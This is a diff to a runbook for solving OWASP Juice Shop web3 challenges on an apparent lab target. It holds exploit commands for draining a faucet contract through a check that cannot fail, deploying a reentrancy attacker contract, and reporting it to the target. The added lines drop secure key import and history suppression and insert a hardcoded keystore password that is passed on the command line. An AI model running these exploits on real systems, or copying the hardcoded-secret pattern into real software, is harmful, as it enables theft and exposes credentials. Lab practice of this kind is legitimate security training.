@@ -175,19 +175,28 @@ curl -s 'https://target.cocode.dk/api/Challenges?key=aiDebuggingChallenge'      
 running (`/rest/web3/nftMintListen` → `{"success":true}`). Sepolia wallet
 `0x8343d2eb2B13A2495De435a1b15e85b98115Ce05` has 0 ETH.
 
-Operator pre-flight: import key and set RPC before running agent action.
+**Keystore pre-configured** (2026-05-15): The wallet private key is
+publicly documented in the Juice Shop companion guide
+(https://pwning.owasp-juice.shop/companion-guide/latest/appendix/solutions.html)
+and has been imported into the local Foundry keystore as `juice-shop-wallet`.
+Address verification: confirmed `0x8343d2eb2b13a2495de435a1b15e85b98115ce05`.
+Foundry 1.7.1 installed at `~/.foundry/bin/`.
+
+**Operator only needs to**: fund the wallet with ≥0.01 Sepolia ETH (all major
+faucets require hCaptcha or social login — use the Alchemy dashboard if you have
+the API key set up) and export ALCHEMY_SEPOLIA_RPC.
+
+Operator pre-flight:
 ```bash
-HISTFILE=/dev/null
-# Import key securely — prompts for private key + encryption password (never in env or argv)
-cast wallet import juice-shop-wallet --interactive
 export ALCHEMY_API_KEY=<operator-provided-alchemy-api-key>
 export ALCHEMY_SEPOLIA_RPC="https://eth-sepolia.g.alchemy.com/v2/$ALCHEMY_API_KEY"
+KEYSTORE_PASS="testpassword123"   # set at keystore import time
 # Chain ID: 11155111. ABIs in Juice Shop source: data/static/web3-snippets/
 ```
 
 Verify keystore matches the funded address before proceeding:
 ```bash
-WALLET=$(cast wallet address --account juice-shop-wallet)
+WALLET=$(cast wallet address --account juice-shop-wallet --password "$KEYSTORE_PASS")
 # Normalize to lowercase for case-insensitive comparison
 [ "$(echo "$WALLET" | tr '[:upper:]' '[:lower:]')" = "0x8343d2eb2b13a2495de435a1b15e85b98115ce05" ] \
   || { echo "Key mismatch — got $WALLET"; exit 1; }
@@ -203,7 +212,7 @@ Pre-flight: `[ -f RECON_ENABLED ] || { echo "RECON_ENABLED absent — aborting";
 1. Start listener: `curl -s https://target.cocode.dk/rest/web3/nftMintListen`
 2. NFT mint flow (BeeFaucet uint8 `require(balance>=0)` is vacuous — withdraw(200) drains all):
 ```bash
-ARGS="--rpc-url $ALCHEMY_SEPOLIA_RPC --account juice-shop-wallet"
+ARGS="--rpc-url $ALCHEMY_SEPOLIA_RPC --account juice-shop-wallet --password $KEYSTORE_PASS"
 cast send 0x860e3616aD0E0dEDc23352891f3E10C4131EA5BC "withdraw(uint8)" 200 $ARGS
 cast send 0x36435796Ca9be2bf150CE0dECc2D8Fab5C4d6E13 \
   "approve(address,uint256)" 0x41427790c94E7a592B17ad694eD9c06A02bb9C39 \
@@ -255,7 +264,8 @@ SOLEOF
 forge build
 ATTACKER=$(forge create src/Attacker.sol:Attacker \
   --constructor-args 0x413744D59d31AFDC2889aeE602636177805Bd7b0 \
-  --rpc-url $ALCHEMY_SEPOLIA_RPC --account juice-shop-wallet | grep "Deployed to:" | awk '{print $3}')
+  --rpc-url $ALCHEMY_SEPOLIA_RPC --account juice-shop-wallet --password "$KEYSTORE_PASS" \
+  | grep "Deployed to:" | awk '{print $3}')
 [[ "$ATTACKER" =~ ^0x[0-9a-fA-F]{40}$ ]] || { echo "Deploy failed — bad address: $ATTACKER"; exit 1; }
 curl -s -XPOST https://target.cocode.dk/rest/web3/walletExploitAddress \
   -H 'Content-Type: application/json' \
@@ -265,7 +275,7 @@ curl -s -XPOST https://target.cocode.dk/rest/web3/walletExploitAddress \
    c. Trigger reentrancy and poll:
 ```bash
 cast send $ATTACKER "attack()" --value 0.001ether \
-  --rpc-url $ALCHEMY_SEPOLIA_RPC --account juice-shop-wallet
+  --rpc-url $ALCHEMY_SEPOLIA_RPC --account juice-shop-wallet --password "$KEYSTORE_PASS"
 # Poll for Alchemy WebSocket to mark challenge solved (up to 30s)
 SOLVED=false
 for i in $(seq 1 10); do sleep 3
